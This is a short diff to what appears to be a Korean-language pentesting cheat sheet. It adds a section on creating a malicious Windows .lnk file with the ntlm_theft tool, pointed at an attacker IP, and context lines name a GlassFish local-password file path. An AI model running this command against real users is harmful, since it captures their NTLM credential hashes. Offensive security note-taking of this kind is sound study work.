@@ -109,3 +109,9 @@ glassfish4/glassfish/domains/domain1/config/local-password
 ---
 # dosbox
 - GUI 상태에서 정상 작동
+---
+# Create malicious Windows file
+```bash
+python3 ntlm_theft.py -g lnk -s <ip> -f vault
+```
+- https://github.com/Greenwolf/ntlm_theft
